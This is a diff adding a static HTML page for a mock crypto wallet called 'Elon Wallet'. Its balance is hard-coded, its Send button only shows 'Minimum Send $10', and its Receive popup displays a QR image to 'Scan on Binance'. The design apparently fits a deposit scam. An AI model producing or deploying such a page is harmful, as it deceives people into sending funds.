@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #0D1321;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background-color: #161B33;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0px 4px 15px rgba(255, 255, 255, 0.1);
+        }
+
+        .balance-card {
+            background: #333A56;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .amount {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 5px 0;
+        }
+
+        .currency {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px;
+            background: #222845;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .currency img {
+            width: 30px;
+            height: 30px;
+        }
+
+        .currency .name {
+            flex: 1;
+            margin-left: 10px;
+            font-size: 16px;
+        }
+
+        .currency .balance {
+            font-weight: bold;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .send, .receive {
+            flex: 1;
+            padding: 12px;
+            margin: 5px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .send {
+            background-color: #e74c3c;
+            color: white;
+        }
+
+        .receive {
+            background-color: #2ecc71;
+            color: white;
+        }
+
+        .send:hover, .receive:hover {
+            transform: scale(1.05);
+        }
+
+        .send-message {
+            display: none;
+            background-color: rgba(255, 0, 0, 0.7);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            color: white;
+            border-radius: 10px;
+            display: none;
+            text-align: center;
+            width: 90%;
+            max-width: 300px;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .popup img {
+            max-width: 200px;
+            margin-bottom: 10px;
+            border-radius: 10px;
+        }
+
+        .popup p {
+            background-color: rgba(0, 200, 0, 0.7);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>Elon Wallet</h1>
+        </header>
+
+        <div class="balance-card">
+            <h2>Total Balance</h2>
+            <p class="amount">$5.06</p>
+        </div>
+
+        <!-- USDT -->
+        <div class="currency">
+            <img src="https://i.postimg.cc/htYyJ282/usdt.png" alt="USDT">
+            <span class="name">USDT</span>
+            <span class="balance">$5.00</span>
+        </div>
+
+        <!-- LUNA -->
+        <div class="currency">
+            <img src="https://i.postimg.cc/LXWQPNM9/cool.png" alt="LUNA">
+            <span class="name">Cat manager</span>
+            <span class="balance">$0.06</span>
+        </div>
+
+        <!-- Lite -->
+        <div class="currency">
+            <img src="https://i.postimg.cc/pVhR6SrB/letter-e.png" alt="LITE">
+            <span class="name">Elan</span>
+            <span class="balance">$0.00</span>
+        </div>
+
+        <!-- BCH -->
+        <div class="currency">
+            <img src="https://i.postimg.cc/Fs0m9Jjd/artificial-intelligence.png" alt="BCH">
+            <span class="name">Ai Can</span>
+            <span class="balance">$0.00</span>
+        </div>
+
+        <div class="buttons">
+            <button class="send" onclick="showSendMessage()">Send</button>
+            <button class="receive" onclick="showQRPopup()">Receive</button>
+        </div>
+
+        <div id="sendMessage" class="send-message">Minimum Send $10</div>
+    </div>
+
+    <!-- QR Code Popup -->
+    <div class="popup" id="qrPopup">
+        <button class="back-btn" onclick="closePopup()">←</button>
+        <img src="https://i.postimg.cc/jd96SsjX/qr-image-1742539445445.png" alt="QR Code">
+        <p>Scan this QR Code on Binance</p>
+    </div>
+
+    <script>
+        function showSendMessage() {
+            let messageBox = document.getElementById("sendMessage");
+            messageBox.style.display = "block";
+
+            setTimeout(() => {
+                messageBox.style.display = "none";
+            }, 2000);
+        }
+
+        function showQRPopup() {
+            document.getElementById('qrPopup').style.display = "block";
+        }
+
+        function closePopup() {
+            document.getElementById('qrPopup').style.display = "none";
+        }
+    </script>
+
+</body>
+</html>
